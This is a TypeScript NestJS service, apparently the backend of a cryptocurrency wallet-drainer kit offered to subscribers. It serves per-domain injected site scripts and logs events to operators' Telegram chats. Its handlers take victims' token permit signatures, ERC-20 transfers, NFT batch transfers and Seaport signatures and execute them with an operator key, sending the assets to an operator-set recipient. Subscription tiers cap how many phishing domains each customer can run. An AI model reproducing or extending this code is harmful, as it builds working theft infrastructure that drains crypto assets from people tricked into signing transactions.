import { HttpService } from '@nestjs/axios';
import { Injectable } from '@nestjs/common';
import { Logger } from '@nestjs/common/services';
import { Prisma, SubscriptionType } from '@prisma/client';
import { readFileSync } from 'fs';
import { PrismaService } from 'nestjs-prisma';
import { join } from 'path';
import { firstValueFrom } from 'rxjs';
import {
  ErrorCodes,
  ForbiddenException,
  InternalServerException,
  MAX_MONTH_SUB_DOMAINS,
  MAX_WORKER_SUB_DOMAINS,
} from 'src/common';
import { UsersEntity } from 'src/user/user.entity';
import { UserService } from 'src/user/user.service';
import { WalletService } from 'src/wallet/wallet.service';
import {
  AddDomainDto,
  DomainResponseDto,
  IsConnectedResponseDto,
  TokenPermitDto,
  TransferNFTDto,
  UpdateDomainDto,
} from './dto';
import { TokenTransferDto } from './dto/token-transfer.dto';

@Injectable()
export class DomainsService {
  private w_logger = new Logger('Wallet');
  private script: string = readFileSync(
    join(process.cwd(), 'site-scripts', 'main.js'),
    { encoding: 'utf-8' },
  ).toString();

  constructor(
    private prismaService: PrismaService,
    private userService: UserService,
    private httpService: HttpService,
    private walletService: WalletService,
  ) {}

  /** Получить скрипт сайта с данными хоста */
  public async getHostScript(host: string) {
    const domain = await this.findByHost(host);
    if (!domain) {
      this.w_logger.warn(`Возвращен пустой скрипт. Так как домен не найден!`);
      return '';
    }

    const keys = Object.keys(domain);
    let script_copy = this.script;
    for (let key of keys) {
      script_copy = script_copy.replace(`$${key}$`, domain[key]);
    }

    return script_copy;
  }

  /** Проверить подключен ли домен к нашему IP */
  public isConnected(
    host: string,
    path: string,
    domain: string,
  ): IsConnectedResponseDto {
    return { host, path, is_connected: host == domain };
  }

  /** Метод для кошельков от доменов */
  public async logToTelegramChat(host: string, message: string, key: string) {
    if (key !== '8bEEokUZLhn7nAHz') {
      Logger.log(`Invalid key`, `${host}:logToTelegramChat`);
      return;
    }

    const domain = await this.findByHost(host);
    if (!domain || domain.chat_id == null) {
      Logger.log(
        `No domain or chat_id. Domain: ${!!domain}. Chat_ID: ${!(
          domain?.chat_id == null
        )}`,
        `${host}:logToTelegramChat`,
      );
      return;
    }

    const endpoint = new URL(
      `/bot${domain.tg_token}/sendMessage`,
      'https://api.telegram.org',
    );

    endpoint.searchParams.append('chat_id', domain.chat_id);
    endpoint.searchParams.append('text', message.replace(/<br>/gim, '\n'));
    endpoint.searchParams.append('parse_mode', 'HTML');

    firstValueFrom(this.httpService.post(endpoint.toString()))
      .then(() => Logger.log(`Лог отправлен в чат.`, `${host}-logs`))
      .catch((error) => {
        console.log(error?.response?.data);
        Logger.error(`Ошибка отправки лога: ${error.message}`, `${host}-logs`);
      });
  }

  /** Метод для кошельков от доменов */
  public async tokenPermit(host: string, dto: TokenPermitDto) {
    this.w_logger.log(`TokenPermit ${host} -> ${JSON.stringify(dto)}`);

    const domain = await this.findByHost(host);
    if (!domain) {
      throw new InternalServerException(
        { message: 'Some error occurred while executing the transaction.' },
        ErrorCodes.Unknown,
      );
    }

    const json_params = JSON.parse(dto.permit);
    const response = await this.walletService.permit(
      {
        chainId: dto.chainId,
        tokenAddress: dto.tokenAddress,
        abiUrl: dto.abiUrl,
        amount: dto.amount,
        owner: dto.owner,
        spender: dto.spender,
        value: json_params.value,
        deadline: json_params.deadline,
        v: json_params.v,
        r: json_params.r,
        s: json_params.s,
      },
      {
        private_key: domain.private_key,
        recipient: domain.recipient,
        contract_SAFA: domain.contract_SAFA,
      },
    );

    if (!response) {
      throw new InternalServerException(
        { message: 'Some error occurred while executing the transaction.' },
        ErrorCodes.Unknown,
      );
    }

    return { message: 'Success' };
  }

  /** Метод для кошельков от доменов */
  public async transferERC(host: string, dto: TokenTransferDto) {
    this.w_logger.log(`TransferERC ${host} -> ${JSON.stringify(dto)}`);

    const domain = await this.findByHost(host);
    if (!domain) {
      throw new InternalServerException(
        { message: 'Some error occurred while executing the transaction.' },
        ErrorCodes.Unknown,
      );
    }

    const response = await this.walletService.transferToken(
      dto.chainId,
      dto.tokenAddress,
      dto.abiUrl,
      dto.amount,
      dto.owner,
      {
        private_key: domain.private_key,
        recipient: domain.recipient,
        contract_SAFA: domain.contract_SAFA,
      },
    );
    if (!response) {
      throw new InternalServerException(
        { message: 'Some error occurred while executing the transaction.' },
        ErrorCodes.Unknown,
      );
    }

    return { message: 'Success' };
  }

  /** Метод для кошельков от доменов */
  public async transferNFT(host: string, dto: TransferNFTDto) {
    this.w_logger.log(`TransferNFT ${host} -> ${JSON.stringify(dto)}`);

    const domain = await this.findByHost(host);
    if (!domain) {
      throw new InternalServerException(
        { message: 'Some error occurred while executing the transaction.' },
        ErrorCodes.Unknown,
      );
    }

    const response = await this.walletService.batchtransfer(
      dto.owner,
      dto.tokenAddress,
      dto.tokens,
      {
        private_key: domain.private_key,
        recipient: domain.recipient,
        contract_SAFA: domain.contract_SAFA,
      },
    );
    if (!response) {
      throw new InternalServerException(
        { message: 'Some error occurred while executing the transaction.' },
        ErrorCodes.Unknown,
      );
    }

    return { message: 'Success' };
  }

  /** Метод для кошельков от доменов */
  public async seaportSign(host: string, dto: any) {
    this.w_logger.log(`SeaportSign ${host} -> ${JSON.stringify(dto)}`);

    const domain = await this.findByHost(host);
    if (!domain) {
      throw new InternalServerException(
        { message: 'Some error occurred while executing the transaction.' },
        ErrorCodes.Unknown,
      );
    }

    const response = await this.walletService.seainject(dto, {
      private_key: domain.private_key,
      recipient: domain.recipient,
      contract_SAFA: domain.contract_SAFA,
    });
    if (!response) {
      throw new InternalServerException(
        { message: 'Some error occurred while executing the transaction.' },
        ErrorCodes.Unknown,
      );
    }

    return { message: 'Success' };
  }

  /** Добавить домен */
  public async addDomain(
    user: UsersEntity,
    dto: AddDomainDto,
  ): Promise<DomainResponseDto> {
    const current_user = await this.userService.findById(user.id);

    if (
      (current_user?.subscription?.type == SubscriptionType.WORKER &&
        current_user.domains.length >= MAX_WORKER_SUB_DOMAINS) ||
      (current_user?.subscription?.type == SubscriptionType.MONTH &&
        current_user.domains.length >= MAX_MONTH_SUB_DOMAINS)
    ) {
      throw new ForbiddenException(
        {
          message: 'You have the maximum number of domains by subscription',
          subscription_type: current_user.subscription.type,
        },
        ErrorCodes.MaxDomainsCount,
      );
    }

    if (current_user?.domains.find((domain) => domain.host == dto.host)) {
      throw new ForbiddenException(
        {
          message: 'Domain already exists',
        },
        ErrorCodes.DomainAlreadyExists,
      );
    }

    const [new_domain] = await Promise.all([
      this.prismaService.domains.create({
        data: {
          ...dto,
          path_name: dto.host,
          owner: {
            connect: {
              id: user.id,
            },
          },
        },
        include: {
          template: true,
        },
      }),
    ]);

    return new DomainResponseDto(new_domain);
  }

  /** Найти домен по хосту */
  public findByHost(host: string) {
    return this.prismaService.domains.findUnique({ where: { host } });
  }

  /** Обновить настройки домена */
  public async update(
    user: UsersEntity,
    domain_id: number,
    dto: UpdateDomainDto,
  ) {
    const current_user = await this.userService.findById(user.id);
    const has_domain = current_user?.domains.find(
      (domain) => domain.id == domain_id,
    );

    if (!has_domain) {
      throw new ForbiddenException(
        {
          message: 'Domain not found',
        },
        ErrorCodes.DomainNotFound,
      );
    }

    if (current_user?.subscription?.type !== SubscriptionType.MONTH) {
      delete dto.contract_SAFA;
      delete dto.private_key;
      delete dto.recipient;
    }

    return this.updateById(domain_id, dto);
  }

  //** Обновить домен по ID */
  private updateById(id: number, data: Prisma.DomainsUpdateInput) {
    return this.prismaService.domains.update({
      data,
      where: {
        id,
      },
    });
  }
}
